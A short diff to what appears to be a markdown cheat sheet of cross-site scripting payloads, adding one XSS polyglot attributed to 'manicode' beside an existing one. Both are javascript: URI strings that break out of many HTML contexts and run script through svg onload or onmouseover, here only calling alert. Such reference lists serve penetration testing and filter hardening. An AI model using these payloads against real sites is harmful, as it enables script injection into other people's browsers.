@@ -482,6 +482,10 @@ javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></st
 
 # by h1/ragnar
 javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
+
+# by manicode
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
 ```
 
 ## Filter Bypass and exotic payloads
